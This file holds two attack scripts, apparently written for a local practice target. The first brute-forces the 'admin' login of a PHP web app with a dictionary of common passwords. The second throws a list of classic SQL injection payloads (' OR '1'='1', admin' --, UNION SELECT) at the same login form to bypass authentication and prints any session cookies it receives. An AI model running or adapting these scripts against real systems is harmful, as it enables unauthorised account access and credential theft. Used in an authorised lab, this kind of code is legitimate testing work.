#!/usr/bin/env python3
"""
Extended password testing for valid user 'admin'
Also examine login responses to understand the authentication flow
"""
import requests

search_url = "http://127.0.0.1:8080/search.php"
login_url = "http://127.0.0.1:8080/login.php"

# First, let's examine what a failed login looks like
print("[DEBUG] Examining login response for wrong password...")
data = {"username": "admin", "password": "wrongpassword123"}
response = requests.post(login_url, data=data, timeout=10, allow_redirects=True)
print(f"Status: {response.status_code}")
print(f"Response text: {response.text}")
print(f"URL after request: {response.url}")
print(f"Cookies: {response.cookies}")
print("-" * 60)

# Extended password list
extended_passwords = [
    # Variations of admin
    "admin", "admin123", "adminadmin", "admin1", "administrator",
    "Admin", "ADMIN", "ADMIN123", "admin@123", "admin01",
    # Security related
    "security", "letmein", "password123", "pass123", "123456789",
    "qwerty123", "qwertyuiop", "welcome123", "welcome1", "changeme1",
    # Application related  
    "phpabusers", "phpabuser", "phpabusers123", "phpabuser123",
    # Admin + year
    "admin2023", "admin2024", "admin2022", "admin2021",
    # Common weak passwords
    "123456", "password", "12345678", "12345", "1234567890",
    "iloveyou", "princess", "dragon", "master", "shadow",
    "sunshine", "ashley", "football", "baseball", "michael",
    "jesus", "mustang", "trustno1", "abc123", "monkey",
    "access", "passw0rd", "p@ssw0rd", "Password1", "Password123",
    # Empty and simple variations
    "", " ", "1", "12", "123", "1234", "12345",
    # Admin with common patterns  
    "Admin1", "Admin123", "admin!", "admin@", "admin#",
    "adm1n", "4dmin", "adming", "admins"
]

user = "admin"
successful_logins = []

print("\n" + "=" * 80)
print(f"EXTENDED PASSWORD TESTING FOR USER: {user}")
print("=" * 80)

for password in extended_passwords:
    data = {"username": user, "password": password}
    try:
        response = requests.post(login_url, data=data, timeout=10, allow_redirects=True)
        
        # Look for successful login indicators
        # Failures typically show "Error!" or login form
        is_failure = "Error!" in response.text or \
                     "<form" in response.text.lower() or \
                     ("login" in response.text.lower() and len(response.text) < 2000)
        
        if not is_failure or "welcome" in response.text.lower() or "dashboard" in response.text.lower():
            successful_logins.append((user, password))
            print(f"[SUCCESS] User: {user}, Pass: '{password}'")
            print(f"Status: {response.status_code}")
            print(f"Final URL: {response.url}")
            print(f"Response length: {len(response.text)}")
            print(f"Cookies: {dict(response.cookies)}")
            print(f"Response content:\n{response.text[:500]}")
            print("-" * 60)
    except Exception as e:
        print(f"[ERROR] Pass: '{password}': {e}")

print("\n" + "=" * 80)
print("RESULTS SUMMARY")
print("=" * 80)
print(f"Passwords tested: {len(extended_passwords)}")
print(f"Successful logins: {len(successful_logins)}")

if successful_logins:
    print("\nWorking credentials:")
    for user, password in successful_logins:
        print(f"  Username: {user}")
        print(f"  Password: '{password}'")
#!/usr/bin/env python3
"""
Test SQL injection in login form for authentication bypass
"""
import requests

login_url = "http://127.0.0.1:8080/login.php"

# SQL Injection payloads to try
sqli_payloads = [
    # Classic injections
    {"username": "' OR '1'='1", "password": "anything"},
    {"username": "' OR '1'='1' --", "password": "anything"},
    {"username": "' OR '1'='1' #", "password": "anything"},
    {"username": "' OR '1'='1'/*", "password": "anything"},
    
    # Admin-specific
    {"username": "admin' --", "password": "anything"},
    {"username": "admin' #", "password": "anything"},
    {"username": "admin'/*", "password": "anything"},
    {"username": "' OR 1=1 --", "password": "anything"},
    
    # Comment-based
    {"username": "' or 1=1--", "password": "anything"},
    {"username": "' or 1=1#", "password": "anything"},
    {"username": "' or 1=1/*", "password": "anything"},
    {"username": "') or '1'='1'--", "password": "anything"},
    {"username": "') or ('1'='1'--", "password": "anything"},
    
    # Boolean-based
    {"username": "' OR '1'='1", "password": "' OR '1'='1"},
    {"username": "' OR 1=1 LIMIT 1--", "password": "anything"},
    {"username": "admin' AND 1=1--", "password": "anything"},
    
    # Union-based variations
    {"username": "' UNION SELECT * FROM users--", "password": "anything"},
    {"username": "' UNION SELECT 1,2,3--", "password": "anything"},
    
    # Common variations
    {"username": "\" OR \"1\"=\"1", "password": "anything"},
    {"username": "\" OR \"1\"=\"1\"--", "password": "anything"},
    {"username": "\" OR 1=1--", "password": "anything"},
    
    # Maleformed patterns
    {"username": "=", "password": "="},
    {"username": "'='", "password": "'='"},
    {"username": "'", "password": "'"},
    {"username": "''", "password": "''"},
    
    # Special patterns
    {"username": "' OR 1--", "password": "anything"},
    {"username": "' OR true--", "password": "anything"},
    {"username": "1' OR '1'='1", "password": "anything"},
]

print("=" * 80)
print("SQL INJECTION LOGIN BYPASS TESTING")
print("=" * 80)

successful_login = None

for payload in sqli_payloads:
    try:
        response = requests.post(login_url, data=payload, timeout=10, allow_redirects=True)
        
        # Look for failure indicators
        is_error = "Error!" in response.text
        has_login_form = "<form" in response.text.lower() and "login" in response.text.lower()
        
        if not is_error and not has_login_form:
            successful_login = payload
            print(f"[SUCCESS] SQLi bypass worked!")
            print(f"  Username: {payload['username']}")
            print(f"  Password: {payload['password']}")
            print(f"  Status: {response.status_code}")
            print(f"  Final URL: {response.url}")
            print(f"  Cookies: {dict(response.cookies)}")
            print(f"  Response:\n{response.text[:800]}")
            print("-" * 60)
            break
        elif is_error:
            pass  # Expected for failed injections
        else:
            pass  # Should check others
            
    except Exception as e:
        print(f"[ERROR] {e}")

print("=" * 80)
if successful_login:
    print(f"SUCCESSFUL BYPASS: Username={successful_login['username']}")
else:
    print("No SQL injection bypass worked with tested payloads")
